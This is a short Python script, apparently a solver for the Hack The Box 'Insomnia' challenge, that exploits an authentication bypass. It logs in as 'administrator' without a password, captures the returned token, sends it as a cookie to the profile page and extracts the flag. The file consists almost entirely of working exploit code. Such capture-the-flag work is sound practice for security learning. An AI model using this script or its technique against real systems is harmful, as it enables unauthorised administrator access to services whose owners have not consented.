import sys
import requests
import re

if  len(sys.argv) != 2:
    print("Usage: python3 Insomnia.py ip:port")
    sys.exit(1)

host = sys.argv[1]
url_login = f"http://{host}/index.php/login"
url_profile = f"http://{host}/index.php/profile"

login_data = {
    "username":"administrator"
}
try:
    response = requests.post(url_login, json=login_data, timeout=10)
    response.raise_for_status()
    token = re.search(r'"token"\s*:\s*"([^"]+)"', response.text)

    if not token:
        print("Token not found!")
        sys.exit(1)

    token = token.group(1)
    headers = {
        "Cookie": f"token={token}"
    }

    response = requests.get(url_profile, headers=headers)
    flag = re.search(r"HTB\{.*?\}", response.text)

    if flag:
        print(flag.group(0))
    else:
        print("Flag not found!")
except requests.exceptions.RequestException as e:
    print(f"Error, request failed: {e}")
    sys.exit(1)
